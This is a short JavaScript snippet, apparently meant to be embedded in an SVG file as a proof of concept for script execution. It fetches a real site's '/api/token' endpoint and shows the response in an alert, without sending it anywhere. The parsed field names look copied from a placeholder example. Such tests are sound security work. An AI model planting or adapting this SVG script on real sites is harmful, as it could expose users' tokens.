svg.script:

function setupFetch() {
  window.fetchResponseBody = async function() {
    try {
      const response = await fetch('https://linktr.ee/api/token');
      const data = await response.json();

      const fullResponse = 'RESPONSE BODY:\n\n' +
        'Status: ' + response.status + ' ' + response.statusText + '\n' +
        'Content-Type: ' + response.headers.get('content-type') + '\n\n' +
        'FULL JSON DATA:\n' +
        JSON.stringify(data, null, 2) + '\n\n' +
        'PARSED FIELDS:\n' +
        'ID: ' + data.id + '\n' +
        'User ID: ' + data.userId + '\n' +
        'Title: ' + data.title + '\n\n' +
        'Body: ' + data.body;

      alert(fullResponse);
    } catch (error) {
      const errorResponse = 'FETCH ERROR:\n\n' +
        'Error: ' + error.message + '\n\n' +
        'This usually means:\n' +
        '- CORS policy blocking request\n' +
        '- Network connection issue\n' +
        '- SVG not embedded in HTML context\n\n' +
        'Try embedding this SVG in an HTML page for full functionality.';

      alert(errorResponse);
    }
  };
}
